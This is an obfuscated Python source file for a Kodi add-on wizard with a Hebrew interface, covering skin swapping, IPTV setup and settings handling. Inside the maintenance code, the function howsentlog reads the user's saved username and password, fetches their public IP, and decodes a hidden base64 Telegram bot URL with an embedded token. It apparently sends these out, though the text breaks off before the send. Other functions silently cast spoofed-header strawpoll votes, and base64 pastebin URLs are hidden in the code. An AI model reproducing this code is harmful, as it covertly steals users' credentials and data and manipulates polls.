# -*- coding: utf-8 -*-
import xbmc ,xbmcaddon ,xbmcgui ,xbmcplugin ,os ,sys ,xbmcvfs ,glob ,random #line:21
import shutil ,logging #line:22
import urllib2 ,urllib #line:23
import re ,time #line:24
import subprocess #line:25
import json #line:26
import zipfile #line:27
import uservar #line:28
import speedtest #line:29
import fnmatch #line:30
from shutil import copyfile #line:31
try :from sqlite3 import dbapi2 as database #line:32
except :from pysqlite2 import dbapi2 as database #line:33
from threading import Thread #line:34
from datetime import date ,datetime ,timedelta #line:35
from urlparse import urljoin #line:36
from resources .libs import extract ,downloader ,downloaderbg ,notify ,debridit ,traktit ,resloginit ,loginit ,skinSwitch ,uploadLog ,yt ,wizard as wiz #line:37
ADDON_ID =uservar .ADDON_ID #line:40
ADDONTITLE =uservar .ADDONTITLE #line:41
ADDON =wiz .addonId (ADDON_ID )#line:42
VERSION =wiz .addonInfo (ADDON_ID ,'version')#line:43
ADDONPATH =wiz .addonInfo (ADDON_ID ,'path')#line:44
DIALOG =xbmcgui .Dialog ()#line:45
DP =xbmcgui .DialogProgress ()#line:46
HOME =xbmc .translatePath ('special://home/')#line:47
LOG =xbmc .translatePath ('special://logpath/')#line:48
PROFILE =xbmc .translatePath ('special://profile/')#line:49
ADDONS =os .path .join (HOME ,'addons')#line:50
USERDATA =os .path .join (HOME ,'userdata')#line:51
PLUGIN =os .path .join (ADDONS ,ADDON_ID )#line:52
PACKAGES =os .path .join (ADDONS ,'packages')#line:53
ADDOND =os .path .join (USERDATA ,'addon_data')#line:54
ADDONDATA =os .path .join (USERDATA ,'addon_data',ADDON_ID )#line:55
ADVANCED =os .path .join (USERDATA ,'advancedsettings.xml')#line:56
SOURCES =os .path .join (USERDATA ,'sources.xml')#line:57
FAVOURITES =os .path .join (USERDATA ,'favourites.xml')#line:58
PROFILES =os .path .join (USERDATA ,'profiles.xml')#line:59
GUISETTINGS =os .path .join (USERDATA ,'guisettings.xml')#line:60
THUMBS =os .path .join (USERDATA ,'Thumbnails')#line:61
DATABASE =os .path .join (USERDATA ,'Database')#line:62
FANART =os .path .join (ADDONPATH ,'fanart.jpg')#line:63
ICON =os .path .join (ADDONPATH ,'icon.png')#line:64
ART =os .path .join (ADDONPATH ,'resources','art')#line:65
WIZLOG =os .path .join (ADDONDATA ,'wizard.log')#line:66
SKIN =xbmc .getSkinDir ()#line:68
BUILDNAME =wiz .getS ('buildname')#line:69
DEFAULTSKIN =wiz .getS ('defaultskin')#line:70
DEFAULTNAME =wiz .getS ('defaultskinname')#line:71
DEFAULTIGNORE =wiz .getS ('defaultskinignore')#line:72
BUILDVERSION =wiz .getS ('buildversion')#line:73
BUILDTHEME =wiz .getS ('buildtheme')#line:74
BUILDLATEST =wiz .getS ('latestversion')#line:75
INSTALLMETHOD =wiz .getS ('installmethod')#line:76
SHOW15 =wiz .getS ('show15')#line:77
SHOW16 =wiz .getS ('show16')#line:78
SHOW17 =wiz .getS ('show17')#line:79
SHOW18 =wiz .getS ('show18')#line:80
SHOWADULT =wiz .getS ('adult')#line:81
SHOWMAINT =wiz .getS ('showmaint')#line:82
AUTOCLEANUP =wiz .getS ('autoclean')#line:83
AUTOCACHE =wiz .getS ('clearcache')#line:84
AUTOPACKAGES =wiz .getS ('clearpackages')#line:85
AUTOTHUMBS =wiz .getS ('clearthumbs')#line:86
AUTOFEQ =wiz .getS ('autocleanfeq')#line:87
AUTONEXTRUN =wiz .getS ('nextautocleanup')#line:88
INCLUDENAN =wiz .getS ('includenan')#line:89
INCLUDEURL =wiz .getS ('includeurl')#line:90
INCLUDEBOBUNLEASHED =wiz .getS ('includebobunleashed')#line:91
INCLUDEELYSIUM =wiz .getS ('includeelysium')#line:92
INCLUDECOVENANT =wiz .getS ('includecovenant')#line:93
INCLUDEVIDEO =wiz .getS ('includevideo')#line:94
INCLUDEALL =wiz .getS ('includeall')#line:95
INCLUDEBOB =wiz .getS ('includebob')#line:96
INCLUDEPHOENIX =wiz .getS ('includephoenix')#line:97
INCLUDESPECTO =wiz .getS ('includespecto')#line:98
INCLUDEGENESIS =wiz .getS ('includegenesis')#line:99
INCLUDEEXODUS =wiz .getS ('includeexodus')#line:100
INCLUDEONECHAN =wiz .getS ('includeonechan')#line:101
INCLUDESALTS =wiz .getS ('includesalts')#line:102
INCLUDESALTSHD =wiz .getS ('includesaltslite')#line:103
INCLUDERESOLVE =wiz .getS ('includeresolve')#line:104
INCLUDEPLACENTA =wiz .getS ('includeplacenta')#line:105
INCLUDENEPTUNE =wiz .getS ('includeneptune')#line:106
INCLUDEGENESISREBORN =wiz .getS ('includegenesisreborn')#line:107
INCLUDEFLIXNET =wiz .getS ('includeflixnet')#line:108
INCLUDEURANUS =wiz .getS ('includeuranus')#line:109
SEPERATE =wiz .getS ('seperate')#line:110
NOTIFY =wiz .getS ('notify')#line:111
NOTEDISMISS =wiz .getS ('notedismiss')#line:112
NOTEID =wiz .getS ('noteid')#line:113
NOTIFY2 =wiz .getS ('notify2')#line:114
NOTEID2 =wiz .getS ('noteid2')#line:115
NOTEDISMISS2 =wiz .getS ('notedismiss2')#line:116
NOTIFY3 =wiz .getS ('notify3')#line:117
NOTEID3 =wiz .getS ('noteid3')#line:118
NOTEDISMISS3 =wiz .getS ('notedismiss3')#line:119
NOTEID =0 if NOTEID ==""else int (NOTEID )#line:120
TRAKTSAVE =wiz .getS ('traktlastsave')#line:121
REALSAVE =wiz .getS ('debridlastsave')#line:122
LOGINSAVE =wiz .getS ('loginlastsave')#line:123
KEEPMOVIEWALL =wiz .getS ('keepmoviewall')#line:124
KEEPMOVIELIST =wiz .getS ('keepmovielist')#line:125
KEEPINFO =wiz .getS ('keepinfo')#line:126
KEEPSOUND =wiz .getS ('keepsound')#line:128
KEEPVIEW =wiz .getS ('keepview')#line:129
KEEPSKIN =wiz .getS ('keepskin')#line:130
KEEPADDONS =wiz .getS ('keepaddons')#line:131
KEEPSKIN2 =wiz .getS ('keepskin2')#line:132
KEEPSKIN3 =wiz .getS ('keepskin3')#line:133
KEEPTORNET =wiz .getS ('keeptornet')#line:134
KEEPPLAYLIST =wiz .getS ('keepplaylist')#line:135
KEEPPVR =wiz .getS ('keeppvr')#line:136
ENABLE =uservar .ENABLE #line:137
KEEPTVLIST =wiz .getS ('keeptvlist')#line:139
KEEPHUBMOVIE =wiz .getS ('keephubmovie')#line:140
KEEPHUBTVSHOW =wiz .getS ('keephubtvshow')#line:141
KEEPHUBTV =wiz .getS ('keephubtv')#line:142
KEEPHUBVOD =wiz .getS ('keephubvod')#line:143
KEEPHUBKIDS =wiz .getS ('keephubkids')#line:144
KEEPHUBMUSIC =wiz .getS ('keephubmusic')#line:145
KEEPHUBMENU =wiz .getS ('keephubmenu')#line:146
KEEPHUBSPORT =wiz .getS ('keephubsport')#line:147
HARDWAER =wiz .getS ('action')#line:148
USERNAME =wiz .getS ('user')#line:149
PASSWORD =wiz .getS ('pass')#line:150
KEEPWEATHER =wiz .getS ('keepweather')#line:151
KEEPFAVS =wiz .getS ('keepfavourites')#line:152
KEEPSOURCES =wiz .getS ('keepsources')#line:153
KEEPPROFILES =wiz .getS ('keepprofiles')#line:154
KEEPADVANCED =wiz .getS ('keepadvanced')#line:155
KEEPREPOS =wiz .getS ('keeprepos')#line:156
KEEPSUPER =wiz .getS ('keepsuper')#line:157
KEEPWHITELIST =wiz .getS ('keepwhitelist')#line:158
KEEPTRAKT =wiz .getS ('keeptrakt')#line:159
KEEPREAL =wiz .getS ('keepdebrid')#line:160
KEEPRD2 =wiz .getS ('keeprd2')#line:161
KEEPLOGIN =wiz .getS ('keeplogin')#line:162
LOGINSAVE =wiz .getS ('loginlastsave')#line:163
DEVELOPER =wiz .getS ('developer')#line:164
THIRDPARTY =wiz .getS ('enable3rd')#line:165
THIRD1NAME =wiz .getS ('wizard1name')#line:166
THIRD1URL =wiz .getS ('wizard1url')#line:167
THIRD2NAME =wiz .getS ('wizard2name')#line:168
THIRD2URL =wiz .getS ('wizard2url')#line:169
THIRD3NAME =wiz .getS ('wizard3name')#line:170
THIRD3URL =wiz .getS ('wizard3url')#line:171
BACKUPLOCATION =ADDON .getSetting ('path')if not ADDON .getSetting ('path')==''else 'special://home/'#line:172
MYBUILDS =os .path .join (BACKUPLOCATION ,'My_Builds','')#line:173
AUTOFEQ =int (float (AUTOFEQ ))if AUTOFEQ .isdigit ()else 3 #line:174
TODAY =date .today ()#line:175
TOMORROW =TODAY +timedelta (days =1 )#line:176
THREEDAYS =TODAY +timedelta (days =3 )#line:177
KODIV =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:178
MCNAME =wiz .mediaCenter ()#line:179
EXCLUDES =uservar .EXCLUDES #line:180
SPEEDFILE =speedtest .SPEEDFILE #line:181
APKFILE =uservar .APKFILE #line:182
YOUTUBETITLE =uservar .YOUTUBETITLE #line:183
YOUTUBEFILE =uservar .YOUTUBEFILE #line:184
SPEED =speedtest .SPEED #line:185
UNAME =speedtest .UNAME #line:186
ADDONFILE =uservar .ADDONFILE #line:187
ADVANCEDFILE =uservar .ADVANCEDFILE #line:188
UPDATECHECK =uservar .UPDATECHECK if str (uservar .UPDATECHECK ).isdigit ()else 1 #line:189
NEXTCHECK =TODAY +timedelta (days =UPDATECHECK )#line:190
NOTIFICATION =uservar .NOTIFICATION #line:191
NOTIFICATION2 =uservar .NOTIFICATION2 #line:192
NOTIFICATION3 =uservar .NOTIFICATION3 #line:193
HELPINFO =uservar .HELPINFO #line:194
ENABLE =uservar .ENABLE #line:195
HEADERMESSAGE =uservar .HEADERMESSAGE #line:196
AUTOUPDATE =uservar .AUTOUPDATE #line:197
WIZARDFILE =uservar .WIZARDFILE #line:198
HIDECONTACT =uservar .HIDECONTACT #line:199
SKINID18 =uservar .SKINID18 #line:200
SKINID18DDONXML =uservar .SKINID18DDONXML #line:201
SKIN18ZIPURL =uservar .SKIN18ZIPURL #line:202
SKINID17 =uservar .SKINID17 #line:203
SKINID17DDONXML =uservar .SKINID17DDONXML #line:204
SKIN17ZIPURL =uservar .SKIN17ZIPURL #line:205
NEWFASTUPDATE =uservar .NEWFASTUPDATE #line:206
CONTACT =uservar .CONTACT #line:207
CONTACTICON =uservar .CONTACTICON if not uservar .CONTACTICON =='http://'else ICON #line:208
CONTACTFANART =uservar .CONTACTFANART if not uservar .CONTACTFANART =='http://'else FANART #line:209
HIDESPACERS =uservar .HIDESPACERS #line:210
TMDB_NEW_API =uservar .TMDB_NEW_API #line:211
COLOR1 =uservar .COLOR1 #line:212
COLOR2 =uservar .COLOR2 #line:213
THEME1 =uservar .THEME1 #line:214
THEME2 =uservar .THEME2 #line:215
THEME3 =uservar .THEME3 #line:216
THEME4 =uservar .THEME4 #line:217
THEME5 =uservar .THEME5 #line:218
ICONBUILDS =uservar .ICONBUILDS if not uservar .ICONBUILDS =='http://'else ICON #line:220
ICONMAINT =uservar .ICONMAINT if not uservar .ICONMAINT =='http://'else ICON #line:221
ICONAPK =uservar .ICONAPK if not uservar .ICONAPK =='http://'else ICON #line:222
ICONADDONS =uservar .ICONADDONS if not uservar .ICONADDONS =='http://'else ICON #line:223
ICONYOUTUBE =uservar .ICONYOUTUBE if not uservar .ICONYOUTUBE =='http://'else ICON #line:224
ICONSAVE =uservar .ICONSAVE if not uservar .ICONSAVE =='http://'else ICON #line:225
ICONTRAKT =uservar .ICONTRAKT if not uservar .ICONTRAKT =='http://'else ICON #line:226
ICONREAL =uservar .ICONREAL if not uservar .ICONREAL =='http://'else ICON #line:227
ICONLOGIN =uservar .ICONLOGIN if not uservar .ICONLOGIN =='http://'else ICON #line:228
ICONCONTACT =uservar .ICONCONTACT if not uservar .ICONCONTACT =='http://'else ICON #line:229
ICONSETTINGS =uservar .ICONSETTINGS if not uservar .ICONSETTINGS =='http://'else ICON #line:230
LOGFILES =wiz .LOGFILES #line:231
TRAKTID =traktit .TRAKTID #line:232
DEBRIDID =debridit .DEBRIDID #line:233
LOGINID =loginit .LOGINID #line:234
MODURL ='http://tribeca.tvaddons.ag/tools/maintenance/modules/'#line:235
MODURL2 ='http://mirrors.kodi.tv/addons/jarvis/'#line:236
INSTALLMETHODS =['Always Ask','Reload Profile','Force Close']#line:237
DEFAULTPLUGINS =['metadata.album.universal','metadata.artists.universal','metadata.common.fanart.tv','metadata.common.imdb.com','metadata.common.musicbrainz.org','metadata.themoviedb.org','metadata.tvdb.com','service.xbmc.versioncheck']#line:238
fullsecfold =xbmc .translatePath ('special://home')#line:239
addons_folder =os .path .join (fullsecfold ,'addons')#line:241
remove_url ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:243
user_folder =os .path .join (xbmc .translatePath ('special://masterprofile'),'addon_data')#line:245
remove_url2 ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:247
fanart =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'fanart.jpg'))#line:248
icon =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'icon.png'))#line:249
IPTV18 ='https://github.com/kodianonymous1/iptvsimple/blob/master/pvr.iptvsimpleandroid.zip?raw=true'#line:252
IPTVSIMPL18PC ='https://github.com/kodianonymous1/iptvsimple/blob/master/pvr.iptvsimple.zip?raw=true'#line:253
def MainMenu ():#line:260
	addItem ('Skin Premium','url',5 ,icon ,fanart ,'')#line:262
def skinWIN ():#line:263
	idle ()#line:264
	OOO00O0O000OOOO00 =glob .glob (os .path .join (ADDONS ,'skin*'))#line:265
	OO0OOOO0OO0OO0O00 =[];OO0OO0O0O000OOOO0 =[]#line:266
	for O0O0OO0000OO0OOO0 in sorted (OOO00O0O000OOOO00 ,key =lambda O0O00OOOOOOO0OO0O :O0O00OOOOOOO0OO0O ):#line:267
		OOO00O000O0000O0O =os .path .split (O0O0OO0000OO0OOO0 [:-1 ])[1 ]#line:268
		O00OO00OOO00O0OOO =os .path .join (O0O0OO0000OO0OOO0 ,'addon.xml')#line:269
		if os .path .exists (O00OO00OOO00O0OOO ):#line:270
			OOOOO0O0OOOOOOOO0 =open (O00OO00OOO00O0OOO )#line:271
			OOOO000000O0000OO =OOOOO0O0OOOOOOOO0 .read ()#line:272
			OOO0O00O0OO000O00 =parseDOM2 (OOOO000000O0000OO ,'addon',ret ='id')#line:273
			OO00OOO0OO0OOOO0O =OOO00O000O0000O0O if len (OOO0O00O0OO000O00 )==0 else OOO0O00O0OO000O00 [0 ]#line:274
			try :#line:275
				O000O00OO0O000OOO =xbmcaddon .Addon (id =OO00OOO0OO0OOOO0O )#line:276
				OO0OOOO0OO0OO0O00 .append (O000O00OO0O000OOO .getAddonInfo ('name'))#line:277
				OO0OO0O0O000OOOO0 .append (OO00OOO0OO0OOOO0O )#line:278
			except :#line:279
				pass #line:280
	O00O00O00000O00OO =[];OO00OOO00O0O0OOOO =0 #line:281
	OO00OOO0OOO0OO00O =["Current Skin -- %s"%currSkin ()]+OO0OOOO0OO0OO0O00 #line:282
	OO00OOO00O0O0OOOO =DIALOG .select ("Select the Skin you want to swap with.",OO00OOO0OOO0OO00O )#line:283
	if OO00OOO00O0O0OOOO ==-1 :return #line:284
	else :#line:285
		O00O000OOOO0000OO =(OO00OOO00O0O0OOOO -1 )#line:286
		O00O00O00000O00OO .append (O00O000OOOO0000OO )#line:287
		OO00OOO0OOO0OO00O [OO00OOO00O0O0OOOO ]="%s"%(OO0OOOO0OO0OO0O00 [O00O000OOOO0000OO ])#line:288
	if O00O00O00000O00OO ==None :return #line:289
	for O0O00OOOO0O00OOO0 in O00O00O00000O00OO :#line:290
		swapSkins (OO0OO0O0O000OOOO0 [O0O00OOOO0O00OOO0 ])#line:291
def currSkin ():#line:293
	return xbmc .getSkinDir ('Container.PluginName')#line:294
def swapSkins (O0OOO0OOO0O0OO000 ,title ="Error"):#line:295
	O00O00OO0O0O00OO0 ='lookandfeel.skin'#line:296
	OO000O0O0OOO0O0OO =O0OOO0OOO0O0OO000 #line:297
	O00OOOOO00OOO0O0O =getOld (O00O00OO0O0O00OO0 )#line:298
	OOO00OO000OO0OO0O =O00O00OO0O0O00OO0 #line:299
	setNew (OOO00OO000OO0OO0O ,OO000O0O0OOO0O0OO )#line:300
	OOO0O00000OO0OO00 =0 #line:301
	while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OOO0O00000OO0OO00 <100 :#line:302
		OOO0O00000OO0OO00 +=1 #line:303
		xbmc .sleep (1 )#line:304
	if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:305
		xbmc .executebuiltin ('SendClick(11)')#line:306
	return True #line:307
def getOld (OO0O0OOOOO000OO00 ):#line:309
	try :#line:310
		OO0O0OOOOO000OO00 ='"%s"'%OO0O0OOOOO000OO00 #line:311
		OOOOOO0000000O000 ='{"jsonrpc":"2.0", "method":"Settings.GetSettingValue","params":{"setting":%s}, "id":1}'%(OO0O0OOOOO000OO00 )#line:312
		OO0O0000OO000OOO0 =xbmc .executeJSONRPC (OOOOOO0000000O000 )#line:314
		OO0O0000OO000OOO0 =simplejson .loads (OO0O0000OO000OOO0 )#line:315
		if OO0O0000OO000OOO0 .has_key ('result'):#line:316
			if OO0O0000OO000OOO0 ['result'].has_key ('value'):#line:317
				return OO0O0000OO000OOO0 ['result']['value']#line:318
	except :#line:319
		pass #line:320
	return None #line:321
def setNew (OOOOO0O0O000O0O0O ,O0O0OO0OOOOOO00O0 ):#line:324
	try :#line:325
		OOOOO0O0O000O0O0O ='"%s"'%OOOOO0O0O000O0O0O #line:326
		O0O0OO0OOOOOO00O0 ='"%s"'%O0O0OO0OOOOOO00O0 #line:327
		OO00O0O0O0OOOO0O0 ='{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}'%(OOOOO0O0O000O0O0O ,O0O0OO0OOOOOO00O0 )#line:328
		O00000O0O0OO0OO00 =xbmc .executeJSONRPC (OO00O0O0O0OOOO0O0 )#line:330
	except :#line:331
		pass #line:332
	return None #line:333
def idle ():#line:334
	return xbmc .executebuiltin ('Dialog.Close(busydialog)')#line:335
def resetkodi ():#line:337
		if xbmc .getCondVisibility ('system.platform.windows'):#line:338
			O00O000O00OO0OO0O =xbmcgui .DialogProgress ()#line:339
			O00O000O00OO0OO0O .create ("ההתקנה תסגר והקודי יעלה אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:342
			O00O000O00OO0OO0O .update (0 )#line:343
			for O000O0000OO0OO000 in range (5 ,-1 ,-1 ):#line:344
				time .sleep (1 )#line:345
				O00O000O00OO0OO0O .update (int ((5 -O000O0000OO0OO000 )/5.0 *100 ),"מתבצע הפעלה מחדש לקודי",'בעוד {0} שניות'.format (O000O0000OO0OO000 ),'')#line:346
				if O00O000O00OO0OO0O .iscanceled ():#line:347
					from resources .libs import win #line:348
					return None ,None #line:349
			from resources .libs import win #line:350
		else :#line:351
			O00O000O00OO0OO0O =xbmcgui .DialogProgress ()#line:352
			O00O000O00OO0OO0O .create ("ההתקנה תסגר אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:355
			O00O000O00OO0OO0O .update (0 )#line:356
			for O000O0000OO0OO000 in range (5 ,-1 ,-1 ):#line:357
				time .sleep (1 )#line:358
				O00O000O00OO0OO0O .update (int ((5 -O000O0000OO0OO000 )/5.0 *100 ),"ההתקנה תסגר",'בעוד {0} שניות'.format (O000O0000OO0OO000 ),'')#line:359
				if O00O000O00OO0OO0O .iscanceled ():#line:360
					os ._exit (1 )#line:361
					return None ,None #line:362
			os ._exit (1 )#line:363
def backtokodi ():#line:365
			wiz .kodi17Fix ()#line:366
			fix18update ()#line:367
			fix17update ()#line:368
def testcommand1 ():#line:370
    import requests #line:371
    OOOOO0OO0O0OO0O0O ='18773068'#line:372
    O00O0OO000OOO0O0O ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+OOOOO0OO0O0OO0O0O ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:384
    O0OOOOO0OOO00O0O0 ='145273320'#line:386
    O000O0OO00O00O0OO ='145272688'#line:387
    if ADDON .getSetting ("auto_rd")=='true':#line:388
        O00000O0O0O0OOOOO =O0OOOOO0OOO00O0O0 #line:389
    else :#line:390
        O00000O0O0O0OOOOO =O000O0OO00O00O0OO #line:391
    O000O0O000OOOOO0O ={'options':O00000O0O0O0OOOOO }#line:395
    OOOO0O00OO0000O00 =requests .post ('https://www.strawpoll.me/'+OOOOO0OO0O0OO0O0O ,headers =O00O0OO000OOO0O0O ,data =O000O0O000OOOOO0O )#line:397
def builde_Votes ():#line:398
   try :#line:399
        import requests #line:400
        O0OOO0OOO000OOO0O ='18773068'#line:401
        O0O0OOO0OOOOOOO0O ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+O0OOO0OOO000OOO0O ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:413
        OO000O00O000OO0OO ='145273320'#line:415
        OOOO0000000O00O0O ={'options':OO000O00O000OO0OO }#line:421
        OO000O0O0OO0OOOOO =requests .post ('https://www.strawpoll.me/'+O0OOO0OOO000OOO0O ,headers =O0O0OOO0OOOOOOO0O ,data =OOOO0000000O00O0O )#line:423
   except :pass #line:424
def update_Votes ():#line:425
   try :#line:426
        import requests #line:427
        O0O0OOOO0O00OO0OO ='18773068'#line:428
        O0OOO0000OO0OOOO0 ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+O0O0OOOO0O00OO0OO ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:440
        O0O0000O0O0OO0OO0 ='145273321'#line:442
        O000OOOO0O000OO00 ={'options':O0O0000O0O0OO0OO0 }#line:448
        O00000O00O0OO0O00 =requests .post ('https://www.strawpoll.me/'+O0O0OOOO0O00OO0OO ,headers =O0OOO0000OO0OOOO0 ,data =O000OOOO0O000OO00 )#line:450
   except :pass #line:451
def testcommand ():#line:455
    setautorealdebrid ()#line:456
def skin_homeselect ():#line:457
	try :#line:459
		OOOO0OO0OOOOO0OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:460
		O000O000OO00OO0O0 =open (OOOO0OO0OOOOO0OOO ,'r')#line:462
		O00000O0000OOO00O =O000O000OO00OO0O0 .read ()#line:463
		O000O000OO00OO0O0 .close ()#line:464
		OOO0OOO0O0OO000O0 ='<setting id="HomeS" type="string(.+?)/setting>'#line:465
		O000OO0OOOO00OO00 =re .compile (OOO0OOO0O0OO000O0 ).findall (O00000O0000OOO00O )[0 ]#line:466
		O000O000OO00OO0O0 =open (OOOO0OO0OOOOO0OOO ,'w')#line:467
		O000O000OO00OO0O0 .write (O00000O0000OOO00O .replace ('<setting id="HomeS" type="string%s/setting>'%O000OO0OOOO00OO00 ,'<setting id="HomeS" type="string"></setting>'))#line:468
		O000O000OO00OO0O0 .close ()#line:469
	except :#line:470
		pass #line:471
def autotrakt ():#line:474
    OO0OOOOOO00O000O0 =(ADDON .getSetting ("auto_trk"))#line:475
    if OO0OOOOOO00O000O0 =='true':#line:476
       from resources .libs import trk_aut #line:477
def traktsync ():#line:479
     OOO00OOOO0OOO00O0 =(ADDON .getSetting ("auto_trk"))#line:480
     if OOO00OOOO0OOO00O0 =='true':#line:481
       from resources .libs import trk_aut #line:484
     else :#line:485
        ADDON .openSettings ()#line:486
def imdb_synck ():#line:488
   try :#line:489
     O00000OOOOO00OOOO =xbmcaddon .Addon ('plugin.video.exodusredux')#line:490
     OOOOO0O0O0OOO0000 =xbmcaddon .Addon ('plugin.video.gaia')#line:491
     O0O00O00OO0000O0O =(ADDON .getSetting ("imdb_sync"))#line:492
     O0OO0O0O0OO0O0OOO ="imdb.user"#line:493
     O0O00000000OO0OOO ="accounts.informants.imdb.user"#line:494
     O00000OOOOO00OOOO .setSetting (O0OO0O0O0OO0O0OOO ,str (O0O00O00OO0000O0O ))#line:495
     OOOOO0O0O0OOO0000 .setSetting ('accounts.informants.imdb.enabled','true')#line:496
     OOOOO0O0O0OOO0000 .setSetting (O0O00000000OO0OOO ,str (O0O00O00OO0000O0O ))#line:497
   except :pass #line:498
def dis_or_enable_addon (O0O0OOO00O000O0OO ,OOO0OO0OOO0O0OO0O ,enable ="true"):#line:500
    import json #line:501
    OO00O000O00OO0O00 ='"%s"'%O0O0OOO00O000O0OO #line:502
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%O0O0OOO00O000O0OO )and enable =="true":#line:503
        logging .warning ('already Enabled')#line:504
        return xbmc .log ("### Skipped %s, reason = allready enabled"%O0O0OOO00O000O0OO )#line:505
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%O0O0OOO00O000O0OO )and enable =="false":#line:506
        return xbmc .log ("### Skipped %s, reason = not installed"%O0O0OOO00O000O0OO )#line:507
    else :#line:508
        OOO00000O0000O000 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(OO00O000O00OO0O00 ,enable )#line:509
        O00OO0000OO00OO00 =xbmc .executeJSONRPC (OOO00000O0000O000 )#line:510
        O0OOO0OOO000OO0OO =json .loads (O00OO0000OO00OO00 )#line:511
        if enable =="true":#line:512
            xbmc .log ("### Enabled %s, response = %s"%(O0O0OOO00O000O0OO ,O0OOO0OOO000OO0OO ))#line:513
        else :#line:514
            xbmc .log ("### Disabled %s, response = %s"%(O0O0OOO00O000O0OO ,O0OOO0OOO000OO0OO ))#line:515
    if OOO0OO0OOO0O0OO0O =='auto':#line:516
     return True #line:517
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:518
def iptvset ():#line:521
  try :#line:522
    OOOOO00OO0000O0O0 =(ADDON .getSetting ("iptv_on"))#line:523
    if OOOOO00OO0000O0O0 =='true':#line:525
       if KODIV >=17 and KODIV <18 :#line:527
         dis_or_enable_addon (('pvr.iptvsimple'),mode )#line:528
         OOOO00O0OOOO0O0O0 =xbmcaddon .Addon ('pvr.iptvsimple')#line:529
         OO000OO0O0O00O0OO =(ADDON .getSetting ("iptvUrl"))#line:531
         OOOO00O0OOOO0O0O0 .setSetting ('m3uUrl',OO000OO0O0O00O0OO )#line:532
         O0OOO000O0O00O00O =(ADDON .getSetting ("epg_Url"))#line:533
         OOOO00O0OOOO0O0O0 .setSetting ('epgUrl',O0OOO000O0O00O00O )#line:534
       if KODIV >=18 and xbmc .getCondVisibility ('system.platform.windows'):#line:537
         iptvsimpldownpc ()#line:538
         wiz .kodi17Fix ()#line:539
         xbmc .sleep (1000 )#line:540
         OOOO00O0OOOO0O0O0 =xbmcaddon .Addon ('pvr.iptvsimple')#line:541
         OO000OO0O0O00O0OO =(ADDON .getSetting ("iptvUrl"))#line:542
         OOOO00O0OOOO0O0O0 .setSetting ('m3uUrl',OO000OO0O0O00O0OO )#line:543
         O0OOO000O0O00O00O =(ADDON .getSetting ("epg_Url"))#line:544
         OOOO00O0OOOO0O0O0 .setSetting ('epgUrl',O0OOO000O0O00O00O )#line:545
       if KODIV >=18 and xbmc .getCondVisibility ('system.platform.android'):#line:547
         iptvsimpldown ()#line:548
         wiz .kodi17Fix ()#line:549
         xbmc .sleep (1000 )#line:550
         OOOO00O0OOOO0O0O0 =xbmcaddon .Addon ('pvr.iptvsimple')#line:551
         OO000OO0O0O00O0OO =(ADDON .getSetting ("iptvUrl"))#line:552
         OOOO00O0OOOO0O0O0 .setSetting ('m3uUrl',OO000OO0O0O00O0OO )#line:553
         O0OOO000O0O00O00O =(ADDON .getSetting ("epg_Url"))#line:554
         OOOO00O0OOOO0O0O0 .setSetting ('epgUrl',O0OOO000O0O00O00O )#line:555
  except :pass #line:556
def howsentlog ():#line:563
       try :#line:564
          import json #line:565
          OO0O00O0O0O000O0O =(ADDON .getSetting ("user"))#line:566
          O0OO0000O0OO0O0O0 =(ADDON .getSetting ("pass"))#line:567
          OO0O00000O0OOO0O0 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:568
          O0OOO00OOO00O0000 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0gICDXqdec15cg15zXmiDXnNeV15I='#line:570
          OOO0O0OOO0O000O00 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:571
          OO00O00000OO00OO0 =str (json .loads (OOO0O0OOO0O000O00 )['ip'])#line:572
          O0O000OOO00O0OO0O =OO0O00O0O0O000O0O #line:573
          O00OOOO000000O0O0 =O0OO0000O0OO0O0O0 #line:574
          import socket #line:576
